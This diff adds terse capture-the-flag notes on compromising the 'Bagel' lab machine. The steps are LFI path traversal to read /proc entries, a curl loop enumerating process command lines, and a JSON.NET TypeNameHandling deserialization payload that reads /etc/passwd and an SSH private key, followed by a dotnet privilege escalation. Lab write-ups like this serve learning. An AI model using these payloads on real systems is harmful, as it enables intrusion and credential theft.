@@ -1,0 +1,48 @@
+we found lfi and we can read file
+
+first thing after lfi is to read the ==proc== file
+
+==/proc/self/cmdline ==     ==/proc/self/environ==
+
+it give away important info .. like we got a app.py file in home dir.
+
+so we looked at it and hosts a like ==ws://localhost==
+
+so we used
+
+==wscat== -c ws://bagel.htb:5000
+
+to connect to server
+
+so we decided to look at all the pid to find something useful as app.py says path to .dll
+
+so we did
+
+```
+#!/bin/bash
+
+for i in $(seq 0 1000);do
+        echo -n  "$i:  "
+        curl http://bagel.htb:8000/?page=../../../../../../../proc/$i/cmdline -o -
+        echo
+done;
+```
+
+to get all the pid and we got the path to .dll file in opt dir
+
+we dwlded at used ==Dnspy== in windows to read the source code and found dev creds and a pathit has something ==TypeNameHandling== so we used
+
+```
+{
+    "RemoveOrder": {
+        "$type": "bagel_server.File, bagel"
+        "ReadFile": "../../../../etc/passwd"
+    }
+}
+```
+
+to read files and got id_rsa ..
+
+we opened wscat and sent this whole thing in a line
+
+after that root was easy just a ==gtfobins dotnet== payload and we rooted it
